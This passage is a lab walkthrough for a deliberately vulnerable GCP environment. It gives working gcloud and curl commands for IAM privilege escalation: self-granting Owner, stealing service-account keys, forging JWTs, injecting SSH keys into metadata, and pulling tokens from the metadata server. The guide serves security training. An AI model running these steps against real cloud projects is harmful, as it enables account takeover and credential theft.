# GCP IAM Privilege Escalation - Exploitation Guide

This guide provides detailed exploitation instructions for all 40 privilege escalation scenarios plus 6 lateral movement paths created by the iam-vulnerable GCP module.

## Table of Contents

- [How It Works](#how-it-works)
- [Getting to the Starting Point](#getting-to-the-starting-point)
- [IAM Service Account (Paths 1-9)](#iam-service-account-paths-1-9)
- [Compute Engine (Paths 10-16)](#compute-engine-paths-10-16)
- [Cloud Functions (Paths 17-18)](#cloud-functions-paths-17-18)
- [Cloud Run (Paths 19-22)](#cloud-run-paths-19-22)
- [Cloud Build (Paths 23-24)](#cloud-build-paths-23-24)
- [Cloud Scheduler (Paths 25-26)](#cloud-scheduler-path-25)
- [Deployment Manager (Path 27)](#deployment-manager-path-27)
- [Composer (Path 28)](#composer-path-28)
- [Dataflow (Path 29)](#dataflow-path-29)
- [Dataproc (Paths 30-31)](#dataproc-paths-30-31)
- [GKE/Kubernetes (Paths 32-33)](#gkekubernetes-paths-32-33)
- [Vertex AI (Paths 34-35)](#vertex-ai-paths-34-35)
- [Cloud Workflows (Path 36)](#cloud-workflows-path-36)
- [Eventarc (Path 37)](#eventarc-path-37)
- [Workload Identity (Path 38)](#workload-identity-path-38)
- [Org Policy (Path 39)](#org-policy-path-39)
- [Deny Bypass (Path 40)](#deny-bypass-path-40)
- [Quick Reference: All Service Accounts](#quick-reference-all-service-accounts)
- [Lateral Movement Paths](#lateral-movement-paths-honorable-mentions)

---

## How It Works

Each privesc path follows this pattern:
1. **Attacker** (you) can impersonate a **vulnerable service account**
2. The **vulnerable SA** has permissions that allow escalation to a **high-privilege SA**
3. The **high-privilege SA** (`privesc-high-priv-sa@PROJECT.iam.gserviceaccount.com`) has Owner role

**Target Service Account (for all paths):**
```
privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com
```

---

## Getting to the Starting Point

For each path, you first need to impersonate the vulnerable service account:

```bash
# Set your project
export PROJECT_ID="your-project-id"

# Method 1: Set impersonation globally
gcloud config set auth/impersonate_service_account SERVICE_ACCOUNT_EMAIL

# Method 2: Per-command impersonation
gcloud COMMAND --impersonate-service-account=SERVICE_ACCOUNT_EMAIL

# Method 3: Generate access token
gcloud auth print-access-token --impersonate-service-account=SERVICE_ACCOUNT_EMAIL
```

---

## IAM Service Account (Paths 1-9)

### Path 1: setIamPolicy on Project

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc1-set-iam-policy@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `resourcemanager.projects.setIamPolicy` |
| **Target** | Project IAM policy |
| **Impact** | Grant yourself Owner role on the project |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc1-set-iam-policy@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Get current IAM policy
gcloud projects get-iam-policy $PROJECT_ID --format=json > policy.json

# Step 3: Edit policy.json to add yourself as Owner
# Add this binding to the "bindings" array:
# {
#   "role": "roles/owner",
#   "members": ["user:your-email@example.com"]
# }

# Step 4: Set the modified policy
gcloud projects set-iam-policy $PROJECT_ID policy.json

# Step 5: Clear impersonation and verify
gcloud config unset auth/impersonate_service_account
gcloud projects get-iam-policy $PROJECT_ID
```

---

### Path 2: Create Service Account Key

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc2-create-sa-key@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccountKeys.create` |
| **Target** | High-privilege service account |
| **Impact** | Persistent access via downloaded key |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc2-create-sa-key@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a key for the high-priv SA
gcloud iam service-accounts keys create key.json \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Clear impersonation
gcloud config unset auth/impersonate_service_account

# Step 4: Activate the stolen key
gcloud auth activate-service-account --key-file=key.json

# Step 5: Verify access
gcloud auth list
gcloud projects get-iam-policy $PROJECT_ID
```

---

### Path 3: setIamPolicy on Service Account

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc3-set-sa-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.setIamPolicy` |
| **Target** | High-privilege service account |
| **Impact** | Grant yourself token creator role on high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc3-set-sa-iam@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Grant yourself token creator on the high-priv SA
gcloud iam service-accounts add-iam-policy-binding \
  privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --member="serviceAccount:privesc3-set-sa-iam@$PROJECT_ID.iam.gserviceaccount.com" \
  --role="roles/iam.serviceAccountTokenCreator"

# Step 3: Clear impersonation
gcloud config unset auth/impersonate_service_account

# Step 4: Now you can directly impersonate the high-priv SA
TOKEN=$(gcloud auth print-access-token --impersonate-service-account=privesc3-set-sa-iam@$PROJECT_ID.iam.gserviceaccount.com)

# Step 5: Now you can directly impersonate the high-priv SA
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" 

```

---

### Path 4: getAccessToken (Direct Impersonation)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc4-get-access-token@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.getAccessToken` |
| **Target** | High-priv SA access token |
| **Impact** | Direct token generation |

```bash
# Step 1: Impersonate the vulnerable SA
TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=privesc4-get-access-token@$PROJECT_ID.iam.gserviceaccount.com)

# Step 2: Generate an access token for the high-priv SA
# The vulnerable SA has Token Creator role on the high-priv SA
curl -X POST \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" \
-d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
| jq -r '.accessToken'

```

---

### Path 5: signBlob

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc5-sign-blob@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.signBlob` |
| **Target** | Sign data as high-priv SA |
| **Impact** | Create signed URLs, forge tokens |

```bash
# Step 1: Set the target as a variable
export HIGH_PRIV_SA="privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com"

# Step 2: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc5-sign-blob@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Create the JWT header and payload (base64url encoded)
HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

NOW=$(date +%s)
EXP=$((NOW + 3600))

PAYLOAD=$(echo -n "{\"iss\":\"$HIGH_PRIV_SA\",\"sub\":\"$HIGH_PRIV_SA\",\"aud\":\"https://oauth2.googleapis.com/token\",\"iat\":$NOW,\"exp\":$EXP,\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Step 4: Create the signing input (header.payload)
SIGNING_INPUT="$HEADER.$PAYLOAD"
echo -n "$SIGNING_INPUT" > /tmp/signing-input.txt

# Step 5: Sign the blob using signBlob permission
gcloud iam service-accounts sign-blob \
  --iam-account=$HIGH_PRIV_SA \
  /tmp/signing-input.txt \
  /tmp/signature.bin

# Step 6: Base64url encode the signature
SIGNATURE=$(cat /tmp/signature.bin | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Step 7: Assemble the complete JWT
JWT="$SIGNING_INPUT.$SIGNATURE"

# Step 8: Exchange the forged JWT for an access token
curl -s -X POST https://oauth2.googleapis.com/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=$JWT" | jq -r '.access_token'

```

---

### Path 6: signJwt

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc6-sign-jwt@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.signJwt` |
| **Target** | Sign JWTs as high-priv SA |
| **Impact** | Generate access tokens via signed JWT |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc6-sign-jwt@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a JWT claim set
cat > /tmp/jwt-claim.json << EOF
{
  "iss": "privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com",
  "sub": "privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com",
  "aud": "https://oauth2.googleapis.com/token",
  "iat": $(date +%s),
  "exp": $(($(date +%s) + 3600)),
  "scope": "https://www.googleapis.com/auth/cloud-platform"
}
EOF

# Step 3: Sign the JWT
gcloud iam service-accounts sign-jwt \
  --iam-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  /tmp/jwt-claim.json /tmp/signed-jwt.txt

# Step 4: Exchange signed JWT for access token
curl -X POST https://oauth2.googleapis.com/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "assertion=$(cat /tmp/signed-jwt.txt)" | jq -r '.access_token'

```

---

### Path 7: Implicit Delegation (Multi-hop)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc7-implicit-deleg@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.implicitDelegation` |
| **Target** | Chain through multiple SAs |
| **Impact** | Reach high-priv SA via delegation chain |

```bash
# The delegation chain is:
#   privesc7-implicit-deleg -> privesc7-medium-priv-sa -> privesc-high-priv-sa
# privesc7 has TokenCreator on medium-priv
# medium-priv has TokenCreator on high-priv

# Step 1: Clear any existing impersonation
gcloud config unset auth/impersonate_service_account

# Step 2: Get a token as privesc7-implicit-deleg (starting point)
TOKEN_PRIV7=$(gcloud auth print-access-token \
  --impersonate-service-account=privesc7-implicit-deleg@$PROJECT_ID.iam.gserviceaccount.com)

# Step 3: Use that token to get a token for medium-priv SA (first hop)
TOKEN_MEDIUM=$(curl -s -X POST \
  -H "Authorization: Bearer $TOKEN_PRIV7" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privesc7-medium-priv-sa@$PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
  | jq -r '.accessToken')

# Step 4: Use the medium-priv token to get a token for high-priv SA (second hop)
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN_MEDIUM" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com:generateAccessToken" \
  | jq -r '.accessToken'

```

---

### Path 8: getOpenIdToken (OIDC)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc8-get-oidc-token@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.getOpenIdToken` |
| **Target** | Generate OIDC tokens for high-priv SA |
| **Impact** | Access IAM-protected services, bypass network controls, federate to external systems |

```bash
# Step 1: Impersonate the vulnerable SA to get an access token
gcloud config set auth/impersonate_service_account \
  privesc8-get-oidc-token@$PROJECT_ID.iam.gserviceaccount.com

ACCESS_TOKEN=$(gcloud auth print-access-token)

# Step 2: Use the IAM Credentials API to generate an OIDC token for the high-priv SA
# Note: gcloud's --impersonate-service-account requires getAccessToken, but the API only needs getOpenIdToken
OIDC_TOKEN=$(curl -s -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"audience": "https://example.com", "includeEmail": true}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com:generateIdToken" \
  | jq -r '.token')

# Step 3: Verify the token asserts the high-priv SA's identity
echo $OIDC_TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
# Output shows: "email": "privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com"
# This proves you can now authenticate as the high-priv SA to any OIDC-protected service
```

**Further Exploitation:** With the OIDC token, you can access any service that trusts the high-priv SA's identity:
**Why This Matters:** OIDC tokens prove identity to services that trust the SA. This includes
> private Cloud Run/Functions, external systems (AWS, Azure, on-prem), and any service using
> GCP identity federation. Unlike `getAccessToken`, this doesn't grant GCP API access directly,
> but many high-value targets rely on OIDC identity verification.

---

### Path 9: updateRole (Custom Role Modification)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc9-update-role@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.roles.update` |
| **Target** | Custom role `privesc_09_modifiableRole` assigned to the SA |
| **Impact** | Add any permission to your role |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc9-update-role@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: List custom roles in the project to find one you can modify
gcloud iam roles list --project=$PROJECT_ID --format="table(name,title)"
# Look for: privesc_09_modifiableRole

# Step 3: Check current permissions on the role
gcloud iam roles describe privesc_09_modifiableRole --project=$PROJECT_ID
# Shows: iam.roles.get, iam.roles.list, iam.roles.update, resourcemanager.projects.get

# Step 4: Add setIamPolicy permission to escalate to Owner
gcloud iam roles update privesc_09_modifiableRole \
  --project=$PROJECT_ID \
  --add-permissions=resourcemanager.projects.setIamPolicy

# Cleanup
gcloud config unset auth/impersonate_service_account
```

---

## Compute Engine (Paths 10-16)

### Path 10: actAs + Compute Instance Create

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc10-actas-compute@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `compute.instances.create` |
| **Supporting Permissions** | `compute.disks.create`, `compute.instances.setServiceAccount` |
| **Target** | New VM with high-priv SA attached |
| **Impact** | Access high-priv SA via VM metadata server |

> **Note:** The supporting permissions above are required to create the boot disk and attach the
> high-privilege service account. Completing the exploit requires additional permissions to access
> the VM - see the completion section below or use techniques from paths 11a-14.

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc10-actas-compute@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a VM with the high-priv SA attached
gcloud compute instances create privesc10-vm \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --zone=us-central1-a
```

> **Note:** Once the instance is created, use the `privesc-instance-connect` SA (or paths 11a-14) to complete the exploit.

| **Completion Permissions** | `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`, `compute.instances.setMetadata`, `iam.serviceAccounts.actAs` (on VM's SA) |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------|

> **Important:** `gcloud compute ssh` requires `iam.serviceAccounts.actAs` on the VM's attached service
> account to modify instance metadata. The `privesc-instance-connect` SA has this permission on the
> high-priv SA, enabling SSH access to VMs running as that SA.

```bash
# Impersonate the instance-connect SA (has completion permissions + actAs on high-priv SA)
gcloud config set auth/impersonate_service_account \
  privesc-instance-connect@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: SSH to the VM
gcloud compute ssh privesc10-vm --zone=us-central1-a

# Step 4: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud compute instances delete privesc10-vm --zone=us-central1-a --quiet
```

---

### Path 11a: setMetadata on Compute (gcloud compute ssh)

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc11a-set-metadata@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instances.setMetadata` + `iam.serviceAccounts.actAs` |
| **Target** | Existing VM with high-priv SA |
| **Impact** | SSH access to VM, steal SA credentials |
| **Requires** | `enable_privesc11a = true` |

> **Note:** This path uses `gcloud compute ssh` which automatically generates SSH keys
> (at `~/.ssh/google_compute_engine`) and injects them into instance metadata.
>
> **Important:** `gcloud compute ssh` requires `iam.serviceAccounts.actAs` permission on the
> VM's attached service account to modify instance metadata. Without this, the SSH key
> injection will fail with "The user does not have access to service account" error.

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc11a-set-metadata@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: SSH directly using gcloud (handles key generation and injection automatically)
gcloud compute ssh privesc11a-instance --zone=us-central1-a

# Step 3: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 11b: setMetadata on Compute (Manual SSH Key Injection)

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc11b-set-metadata@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instances.setMetadata` + `iam.serviceAccounts.actAs` |
| **Target** | Existing VM with high-priv SA |
| **Impact** | SSH access to VM, steal SA credentials |
| **Requires** | `enable_privesc11b = true` |

> **Note:** This path demonstrates manual SSH key generation and injection using
> `gcloud compute instances add-metadata`. This is useful when `gcloud compute ssh`
> is not available or when you need more control over the SSH key lifecycle.
>
> **Important:** Modifying instance metadata requires `iam.serviceAccounts.actAs` permission
> on the VM's attached service account. Without this, the metadata update will fail.

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc11b-set-metadata@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Generate SSH key manually
ssh-keygen -t rsa -f /tmp/privesc11b-key -N ""

# Step 3: Add your SSH key to the target instance metadata
gcloud compute instances add-metadata privesc11b-instance \
  --zone=us-central1-a \
  --metadata="ssh-keys=attacker:$(cat /tmp/privesc11b-key.pub)"

# Step 4: SSH to the instance using your key
ssh -i /tmp/privesc11b-key attacker@INSTANCE_EXTERNAL_IP

# Step 5: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 12: setCommonInstanceMetadata (Project-level SSH Keys)

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc12-set-proj-meta@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.projects.setCommonInstanceMetadata` + `iam.serviceAccounts.actAs` (project-level) |
| **Supporting Permissions** | `compute.projects.get`, `compute.instances.list`, `compute.instances.get`, `compute.zones.list` |
| **Target** | Project-level metadata (affects ALL instances) |
| **Impact** | SSH access to ALL VMs in project, steal SA credentials from any VM |
| **Requires** | `enable_privesc12 = true` |

> **Note:** This is more powerful than Path 11a because project-level SSH keys grant access to ALL
> instances in the project, not just one. An attacker only needs to find one VM with a high-privilege
> service account attached.
>
> **Important:** Project-level metadata modification requires `iam.serviceAccounts.actAs` at the
> **project level** (via `roles/iam.serviceAccountUser` on the project). After injecting keys, we
> use direct `ssh` to connect since the key is already authorized in project metadata.

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc12-set-proj-meta@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Generate SSH key
ssh-keygen -t rsa -f /tmp/privesc12-key -N ""

# Step 3: Get current project metadata
gcloud compute project-info describe --format="json" > /tmp/project-metadata.json

# Step 4: Add your SSH key to project-level metadata
# This grants SSH access to ALL instances in the project
gcloud compute project-info add-metadata \
  --metadata-from-file=ssh-keys=<(echo "attacker:$(cat /tmp/privesc12-key.pub)")

# NOTE: You may see an error about 'compute.globalOperations.get' permission.
# This can be ignored - the metadata update succeeds, gcloud just can't poll
# the operation status. Verify with: gcloud compute project-info describe

# Step 5: SSH to any instance
ssh -i /tmp/privesc12-key attacker@INSTANCE_EXTERNAL_IP

# Step 6: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 13: Existing SSH Access to High-Priv VM

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc13-existing-ssh@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | Existing SSH key in project/instance metadata |
| **Supporting Permissions** | `compute.instances.list`, `compute.instances.get`, `compute.zones.list`, `compute.projects.get` |
| **Target** | VM with high-priv SA where attacker already has SSH access |
| **Impact** | Steal SA credentials from VM metadata server |
| **Requires** | `enable_privesc13 = true` |

> **Note:** This path demonstrates the risk when SSH keys are broadly distributed (e.g., added to
> project metadata by an admin) and VMs have over-permissioned service accounts. The attacker has
> minimal GCP permissions but can escalate by SSHing to a VM with a high-priv SA.

```bash
# SCENARIO: An SSH key exists on an instance with a high-privilege service account.
# This simulates a situation where an admin added your key to the instance metadata.
# Terraform deploys the key and saves the private key to ./privesc13-sshkey.pem

# Step 1: Impersonate the vulnerable SA (has minimal permissions)
gcloud config set auth/impersonate_service_account \
  privesc13-existing-ssh@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Check for existing SSH keys in project-level metadata
gcloud compute project-info describe --format=json | \
  jq -r '.commonInstanceMetadata.items[] | select(.key=="ssh-keys") | .value'

# Step 3: Check for SSH keys on specific instances
gcloud compute instances describe privesc13-instance --zone=us-central1-a --format=json | \
  jq -r '.metadata.items[] | select(.key=="ssh-keys") | .value'

# Step 4: List instances to find ones with high-priv service accounts
gcloud compute instances list --format="table(name,zone,networkInterfaces[0].accessConfigs[0].natIP,serviceAccounts[0].email)"

# Look for: privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com

# Step 5: SSH using the pre-installed SSH key
# Terraform generates an SSH key and injects it into the instance metadata.
# The private key is saved to: ./privesc13-sshkey.pem (in the terraform root directory)
# Username: privesc13
ssh -i ./privesc13-sshkey.pem privesc13@INSTANCE_EXTERNAL_IP

# Step 6: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**Detection Challenge:** This attack is hard to detect because:
- The attacker is using legitimate SSH access (their key is authorized)
- No new keys are added to metadata
- The only anomaly is metadata server access patterns from the VM

---

### Path 14: OS Login (Admin SSH Access)

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc14-os-login@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instances.osAdminLogin` + `iam.serviceAccounts.actAs` |
| **Supporting Permissions** | `compute.instances.get`, `compute.instances.list`, `compute.zones.list` (via `roles/compute.viewer`) |
| **Target** | VM with OS Login enabled |
| **Impact** | Root SSH access, steal SA credentials |
| **Requires** | `enable_privesc14 = true` |

> **Note:** OS Login uses a different permission model than metadata-based SSH keys. Instead of
> injecting SSH keys into metadata, it uses GCP's identity system to authenticate users.
>
> **Important:** OS Login still requires `iam.serviceAccounts.actAs` on the VM's attached service
> account. This is because logging into the VM means "acting as" that service account (you can
> access its credentials via the metadata server). The key difference from metadata-based SSH is
> that OS Login authenticates via GCP identity rather than SSH public keys.

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc14-os-login@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Add the Terraform-generated SSH key to the OS Login profile
# OS Login requires an SSH key registered with your GCP identity
# Terraform creates privesc14-sshkey.pem (private) and privesc14-sshkey.pem.pub (public)
gcloud compute os-login ssh-keys add --key-file=./privesc14-sshkey.pem.pub

# Step 3: SSH using OS Login with the generated key
gcloud compute ssh privesc14-instance --zone=us-central1-a \
  --ssh-key-file=./privesc14-sshkey.pem

# Step 4: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 15: setServiceAccount on Compute

| Property | Value |
|----------|-------|
| Status | Disabled by Default |
| **Starting SA** | `privesc15-set-sa@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `compute.instances.setServiceAccount` |
| **Supporting Permissions** | `compute.instances.stop`, `compute.instances.start` |
| **Target** | Existing VM |
| **Impact** | Change VM's SA to high-priv SA |
| **Requires** | `enable_privesc15 = true` |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc15-set-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Stop the target instance
gcloud compute instances stop privesc15-instance --zone=us-central1-a

# Step 3: Change the service account
gcloud compute instances set-service-account privesc15-instance \
  --zone=us-central1-a \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform

# Step 4: Start the instance
gcloud compute instances start privesc15-instance --zone=us-central1-a
```

> **Note:** Once the service account is changed, use the `privesc-instance-connect` SA (or paths 11a-14) to complete the exploit.

| **Completion Permissions** | `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`, `compute.instances.setMetadata`, `iam.serviceAccounts.actAs` (on VM's SA) |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------|

> **Important:** `gcloud compute ssh` requires `iam.serviceAccounts.actAs` on the VM's attached service
> account. The `privesc-instance-connect` SA has this on the high-priv SA.

```bash
# Impersonate the instance-connect SA (has completion permissions + actAs on high-priv SA)
gcloud config set auth/impersonate_service_account \
  privesc-instance-connect@$PROJECT_ID.iam.gserviceaccount.com

# Step 5: SSH and grab the new SA token
gcloud compute ssh privesc15-instance --zone=us-central1-a

# Step 6: From inside the VM, get the SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

---

### Path 16: Instance Templates

This path has three sub-paths demonstrating different levels of exploitation based on
available permissions.

#### Path 16a: Instance Templates Only (Persistence/Staging)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc16a-inst-templ@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `compute.instanceTemplates.create` |
| **Supporting Permissions** | `compute.networks.get`, `compute.subnetworks.get` |
| **Target** | Create template with high-priv SA |
| **Impact** | Low - Persistence mechanism, requires waiting for someone else to use template |

> **Note:** This sub-path creates a template that *could* be used to spawn VMs with a
> high-privilege SA attached. However, without instance creation permissions, the attacker
> cannot immediately exploit this. The risk is that automation or another user may use
> the malicious template, unknowingly spawning VMs with elevated privileges.

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc16a-inst-templ@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create an instance template with high-priv SA
gcloud compute instance-templates create privesc16a-template \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --machine-type=e2-micro 

# Step 3: Verify the template was created with the high-priv SA
gcloud compute instance-templates describe privesc16a-template \
  --format="value(properties.serviceAccounts[0].email)"
# Output: privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com

# The template now exists - if anyone uses it, VMs will have high-priv SA access
# Attacker cannot proceed further without compute.instances.create or
# compute.instanceGroupManagers.create permissions

# Cleanup
gcloud config unset auth/impersonate_service_account
gcloud compute instance-templates delete privesc16a-template --quiet
```

---

#### Path 16b: Instance Templates + Instance Creation (Full Exploitation)

| Property | Value |
|----------|-------|
| Status | Enabled by Default |
| **Starting SA** | `privesc16b-inst-templ@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `iam.serviceAccounts.actAs` + `compute.instanceTemplates.create` + `compute.instances.create` |
| **Supporting Permissions** | `compute.networks.get`, `compute.subnetworks.get`, `compute.disks.create`, `compute.instances.setServiceAccount` |
| **Target** | Create template and spawn VM with high-priv SA |
| **Impact** | Critical - Full escalation, SSH to VM and extract SA token |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc16b-inst-templ@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create an instance template with high-priv SA
gcloud compute instance-templates create privesc16b-template \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --machine-type=e2-micro

# Step 3: Create an instance from the template
gcloud compute instances create privesc16b-vm \
  --source-instance-template=privesc16b-template \
  --zone=us-central1-a
```

> **Note:** Once the instance is created, use the `privesc-instance-connect` SA (or paths 11a-14) to complete the exploit.

| **Completion Permissions** | `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`, `compute.instances.setMetadata`, `iam.serviceAccounts.actAs` (on VM's SA) |
|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------|

> **Important:** `gcloud compute ssh` requires `iam.serviceAccounts.actAs` on the VM's attached service
> account. The `privesc-instance-connect` SA has this on the high-priv SA.

```bash
# Impersonate the instance-connect SA (has completion permissions + actAs on high-priv SA)
gcloud config set auth/impersonate_service_account \
  privesc-instance-connect@$PROJECT_ID.iam.gserviceaccount.com

